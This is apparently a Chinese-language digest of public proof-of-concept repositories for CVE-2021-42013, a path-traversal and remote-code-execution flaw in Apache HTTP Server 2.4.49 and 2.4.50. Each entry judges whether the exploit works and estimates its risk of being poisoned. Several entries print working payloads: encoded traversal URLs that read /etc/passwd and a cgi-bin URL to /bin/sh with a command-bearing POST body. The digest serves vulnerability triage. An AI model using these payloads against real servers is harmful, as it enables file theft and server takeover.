**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器完全控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，并且配置了Alias-like指令，CGI脚本也需要启用才能实现RCE

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013 漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历攻击，将 URL 映射到 Alias-like 指令配置的目录之外的文件。如果这些目录之外的文件没有被默认的 “require all denied” 配置保护，请求就能成功。如果 CGI 脚本对这些 aliased 路径启用，可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历 (LFI):** 攻击者使用 `icons/%%32%65%%32%65/...` 这样的payload进行路径穿越，读取服务器上的任意文件（例如 `/etc/passwd`）。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI，攻击者可以利用路径遍历访问 `cgi-bin` 目录，并执行任意命令。PoC 代码中使用了 `.%%32%65` 编码绕过了一些过滤。
    *   PoC 代码中，RCE 通过构造包含恶意命令的 HTTP POST 请求发送到 `cgi-bin` 目录下的 `sh` 脚本来实现。

**有效性评估：**

提供的 PoC 代码有效。它包含 LFI 和 RCE 两种利用方式，并且提供了命令行参数来指定目标 URL，要读取的文件，或者要执行的命令。

**投毒风险评估：**

检查 PoC 代码，没有发现明显的恶意代码或后门。该代码主要功能是利用漏洞进行文件读取或命令执行，没有发现主动修改或上传文件的行为。代码的功能与漏洞描述一致，风险较低。


**项目地址:** [hadrian3689/apache_2.4.50](https://github.com/hadrian3689/apache_2.4.50)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #14

**来源**: [CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md](../2021/CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并启用CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013漏洞是CVE-2021-41773修复不完全导致的。攻击者可以利用路径遍历漏洞，访问Alias指令配置目录之外的文件。如果这些文件没有被"require all denied"等默认配置保护，请求就会成功。如果CGI脚本也为此路径启用，则可能导致远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都表明CVE-2021-42013是一个已知的、可利用的漏洞，并且存在公开的PoC。

**利用方式：**
利用方式是构造包含路径遍历的URL，结合CGI脚本执行命令。PoC中的`exploit.sh`脚本使用curl发送包含恶意命令的POST请求到目标服务器。关键点在于使用`--path-as-is`参数，以及双URL编码的路径遍历字符串`%%32%65`，绕过Apache的路径检查。如果目标服务器开启了CGI，并且未对/bin/sh等命令进行限制，则可以执行任意命令。

**投毒风险评估：**
分析提供的Dockerfile、httpd.conf、exploit.sh和README.md文件。

*   Dockerfile： 使用了官方的httpd:2.4.50镜像作为基础镜像,并复制httpd.conf和index.html,未发现恶意行为。
*   httpd.conf：正常的Apache配置文件，用于配置服务器基本信息,没有发现不正常的配置。
*   exploit.sh：这是一个漏洞利用脚本，它本身就是用来执行恶意操作的，**不能算作** 投毒代码。脚本的目的是利用漏洞，而非在目标系统植入后门或者进行其他恶意活动。
*   README.md: 只是说明了如何使用Docker环境来运行漏洞利用代码的步骤.

虽然没有明显的投毒代码，但是利用漏洞本身就可以在目标服务器上执行恶意操作。比如，攻击者可以利用这个漏洞上传webshell，从而长期控制服务器。这种通过漏洞植入后门的风险依然存在，但是从代码本身来看，并没有发现作者预先植入的、非漏洞利用目的的恶意代码。
 综合评估，认为存在10%的投毒风险，主要是因为利用成功后，攻击者可以自行植入恶意代码。

**项目地址:** [jas9reet/CVE-2021-42013-LAB](https://github.com/jas9reet/CVE-2021-42013-LAB)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #15

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.get.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.get.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且Alias配置不当并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的一个路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息明确指出该漏洞允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。搜索引擎结果也证实了该漏洞的存在，并提供了相关的利用信息。

提供的 Dockerfile 和 Python 脚本 `cve-2021-42013.py` 构成了一个可用于验证和利用该漏洞的 POC。Dockerfile 用于构建一个包含易受攻击的 Apache HTTP Server 2.4.50 实例的 Docker 镜像。Python 脚本可以用来检测路径遍历或远程代码执行漏洞。

**投毒风险：**

对 POC 代码进行分析，`cve-2021-42013.py` 脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。它包含以下功能：

*   **路径遍历 PoC (-pt)：**  尝试利用路径遍历漏洞读取服务器上的文件。
*   **远程代码执行 PoC (-rce)：**  如果服务器启用了 CGI，则尝试执行命令。
*   **批量扫描 (-l)：**  从文件中读取 URL 列表并进行扫描。

潜在的投毒风险点在于：

1.  **依赖项：**  脚本依赖于 `requests` 和 `urllib` 库，理论上可以通过篡改这些库来植入恶意代码，但这种情况的可能性较低。
2.  **CGI 执行：**  远程代码执行依赖于服务器启用 CGI，如果攻击者控制了 CGI 脚本的内容，则可以执行任意代码。但这更多的是漏洞利用本身的风险，而非 POC 代码的投毒。

综合来看，该 POC 代码的投毒风险较低，约为 5%。 主要风险来自CGI环境和脚本本身。没有发现明显的恶意代码。

**利用方式：**

利用该漏洞需要以下步骤：

1.  **确定目标服务器是否运行受影响的 Apache HTTP Server 版本 (2.4.49 或 2.4.50)。**
2.  **检查服务器的 Alias 配置。**  Alias 指令将 URL 映射到文件系统上的特定目录。漏洞利用的关键在于绕过这些 Alias 指令的限制。
3.  **如果服务器启用了 CGI，则可以尝试远程代码执行。**  攻击者可以构造一个包含恶意代码的 CGI 脚本，并通过路径遍历漏洞来执行它。
4.  **如果服务器未启用 CGI，则可以尝试路径遍历漏洞来读取敏感文件。**

攻击者可以使用如下 payload 来进行漏洞测试：

*   **路径遍历：** `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
*   **远程代码执行：**  需要服务器启用 CGI，并构造包含恶意代码的 CGI 脚本。

**项目地址:** [mightysai1997/cve-2021-42013.get](https://github.com/mightysai1997/cve-2021-42013.get)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #16

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且存在Alias配置不当或CGI脚本未做权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是对CVE-2021-41773的不完全修复。攻击者可以利用路径遍历漏洞读取Alias配置目录之外的文件，如果未配置"require all denied"，则可以成功读取。如果同时启用了CGI脚本，则可能导致远程代码执行。

**有效性：** 提供的POC代码针对CVE-2021-42013，包含Dockerfile、README.md和利用脚本。Dockerfile用于构建存在漏洞的Apache HTTP Server环境，README.md包含漏洞描述、环境搭建和脚本使用说明。利用脚本cve-2021-42013.py提供路径遍历和远程代码执行两种利用方式，通过参数`-u`指定目标URL，`-pt`执行路径遍历，`-rce`执行远程代码执行，`-l`批量扫描。

**投毒风险：**  检查`cve-2021-42013.py` 脚本，发现脚本功能正常，主要是构造payload发送请求，判断是否存在漏洞。 但是Dockerfile中直接wget下载了 httpd-2.4.50.tar.gz 包，存在被中间人攻击替换为恶意包的风险。且start.sh脚本权限被设置为777，任何用户都有修改权限，存在被植入后门的风险。 综合评估，投毒风险较低，约为10%。

**利用方式：**

1.  **路径遍历：** 利用`..`进行目录跳转，读取目标服务器上的任意文件。例如，`http://target/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以构造包含恶意代码的URL来执行命令。例如，访问`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`并传入shell命令作为参数。

利用的前提是目标Apache服务器版本为2.4.49或2.4.50，且存在Alias配置不当，或者CGI脚本未做严格的权限控制。需要关注服务器配置是否启用CGI，以及是否存在权限开放的目录，例如`icons`目录。

**项目地址:** [mightysai1997/cve-2021-42013](https://github.com/mightysai1997/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #17

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013L.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013L.md)

## CVE-2021-42013: Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，并且存在Alias-like指令配置，同时CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是 CVE-2021-41773 的不完整修复。

**有效性：**

提供的POC代码有效。它展示了利用路径遍历漏洞读取 `/etc/passwd` 文件的几种方式。通过URL编码 `.` (点) 字符（例如：`%2e`, `%32%65`），攻击者可以绕过服务器的安全检查，访问受限目录之外的文件。

**投毒风险：**

该仓库主要包含漏洞利用相关的文档和PoC，直接嵌入恶意代码的可能性较低。但仍不能完全排除投毒风险，因为攻击者可能会修改 README.md 等文件诱导用户执行恶意操作，例如下载恶意软件，占比约为5%。

**利用方式：**

1.  **路径遍历：** 攻击者利用URL中的编码过的路径遍历字符（如 `.%%32e/.%%32e/.%%32e/.%%32e` ）尝试访问位于Alias-like指令配置目录之外的文件。
2.  **信息泄露：** 如果成功绕过限制，攻击者可以读取服务器上的敏感文件，如 `/etc/passwd`，从而获取系统用户信息。
3.  **远程代码执行：** 如果CGI脚本被启用，攻击者可能上传包含恶意代码的CGI脚本并执行，从而实现远程代码执行。

**总结：**

此漏洞利用的关键在于利用路径遍历绕过Alias-like指令的限制，从而访问和执行服务器上的文件。如果服务器配置不当（例如，CGI脚本启用，且未对Alias-like指令配置目录外的文件设置`require all denied`），则可能导致严重的后果，包括敏感信息泄露和远程代码执行。

**项目地址:** [mightysai1997/cve-2021-42013L](https://github.com/mightysai1997/cve-2021-42013L)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #18

**来源**: [CVE-2021-42013-viliuspovilaika_cve-2021-42013.md](../2021/CVE-2021-42013-viliuspovilaika_cve-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许攻击者读取任意文件和执行任意命令

**影响版本:** 2.4.49 and 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，且启用了 CGI 脚本支持，Alias-like 指令配置不当。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上任意文件，如果服务器配置允许执行 CGI 脚本，则可以通过构造恶意请求执行任意命令。

**有效性：**

提供的 POC 代码是有效的。搜索引擎结果和漏洞库信息均表明 CVE-2021-42013 允许路径遍历和远程代码执行，POC 代码本身也实现了利用该漏洞进行命令执行的功能。

**投毒风险：**

代码本身的功能是利用漏洞进行攻击，不属于恶意投毒代码，但是作者有可能通过其他方式进行投毒，比如修改下载链接，放置引流信息等，几率较低，大约为 5%。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`/.%%%%32%%65`，用于绕过 Apache 的路径规范化）的 URL，利用 Apache HTTP Server 在处理 Alias-like 指令时的缺陷，突破目录限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问到 CGI 脚本的目录，然后构造包含恶意命令的请求体，利用 CGI 脚本执行任意命令。
3.  **具体步骤：**
    *   构造 URL：`{host}/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh`
    *   构造 POST 数据：`echo Content-Type: text/plain; echo; {command}`
    *   发送 HTTP 请求，服务器执行命令并将结果返回。

**项目地址:** [viliuspovilaika/cve-2021-42013](https://github.com/viliuspovilaika/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #19

**来源**: [CVE-2021-42013-vudala_CVE-2021-42013.md](../2021/CVE-2021-42013-vudala_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行受影响的Apache版本，存在Alias-like指令配置，且允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历和远程代码执行漏洞。该漏洞是CVE-2021-41773的不完整修复。攻击者可以通过构造包含路径遍历序列（如`..`）的恶意URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果服务器配置允许在这些别名路径上执行CGI脚本，攻击者还可以利用该漏洞执行任意代码。

**有效性评估：**
根据漏洞信息、搜索结果和提供的Dockerfile和docker-compose.yml，提供的POC代码旨在搭建一个存在漏洞的Apache HTTP Server 2.4.50环境。因此，该POC代码是有效的，可以用于验证和复现该漏洞。

**投毒风险评估：**
仔细分析了Dockerfile，httpd.conf和suricata.yaml文件，该文件用于部署一个可利用的Apache服务器。然而，无法保证其中没有任何隐藏的恶意代码。虽然主要目的是重现CVE-2021-42013，但仍存在细微的投毒风险。尽管可能性较低，但在未充分审查每个组件的情况下，无法完全排除风险。
httpd.conf可能存在非默认配置，方便漏洞利用。

**利用方式分析：**
1.  **环境搭建：** 使用提供的Dockerfile和docker-compose.yml搭建存在漏洞的Apache HTTP Server 2.4.50环境。
2.  **路径遍历：**  构造包含路径遍历序列的URL，例如：`http://<服务器IP>:8080/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试访问服务器上的`/etc/passwd`文件。
3.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，可以构造包含恶意代码的URL，例如：`http://<服务器IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh`，并执行系统命令。

成功利用此漏洞需要满足特定条件，包括存在易受攻击的Apache版本、适当的服务器配置和网络可访问性。

**项目地址:** [vudala/CVE-2021-42013](https://github.com/vudala/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #20

**来源**: [CVE-2021-42013-walnutsecurity_cve-2021-42013.md](../2021/CVE-2021-42013-walnutsecurity_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且Alias配置不当，允许访问受限目录，如果开启了CGI脚本支持，则可能造成RCE

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**漏洞利用方式：**

攻击者可以利用路径遍历攻击，将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 “require all denied” 等常见默认配置的保护，请求就会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

根据提供的 Dockerfile 和 Python 脚本，利用方式如下：

1.  **路径遍历：** 通过构造包含 ".." 的恶意 URL，绕过 Alias 限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果服务器启用了 CGI，攻击者可以上传一个包含恶意代码的 CGI 脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码包含一个 Dockerfile 和一个 Python 脚本。Dockerfile 用于构建一个存在漏洞的 Apache HTTP Server 2.4.50 实例。Python 脚本 `cve-2021-42013.py` 用于检测和利用该漏洞，支持以下功能：

*   检查是否存在路径遍历漏洞
*   执行路径遍历 PoC，尝试读取敏感文件
*   执行远程代码执行 PoC，尝试执行任意命令

**投毒风险分析：**

对提供的`cve-2021-42013.py`脚本进行分析，发现存在一定的投毒风险。例如：
1.   **执行任意命令的潜在风险**：远程代码执行PoC中，如果构造的命令过于复杂或者包含恶意代码，可能会对目标系统造成破坏。
2.  **批量扫描的风险**：批量扫描功能可能会被用于非法用途，例如扫描大量服务器并尝试利用该漏洞。
3.  **依赖风险**：脚本中用到了requests和urllib库，如果这些库被篡改，可能会导致脚本执行恶意代码。

尽管脚本提供了路径遍历和RCE的验证，存在滥用的可能性，但恶意代码本身没有隐藏在代码中，考虑到其他风险，投毒风险相对较低，暂定为10%。

**项目地址:** [walnutsecurity/cve-2021-42013](https://github.com/walnutsecurity/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

